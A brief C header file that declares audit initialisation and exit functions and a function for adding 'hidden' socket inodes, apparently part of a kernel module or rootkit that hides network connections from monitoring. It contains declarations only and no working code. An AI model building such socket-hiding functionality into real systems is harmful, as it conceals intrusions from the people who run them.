#ifndef BAT_AUDIT_H
#define BAT_AUDIT_H

int  audit_init(void);
void audit_exit(void);
void add_hidden_socket_inode(unsigned long ino);

#endif /* BAT_AUDIT_H */
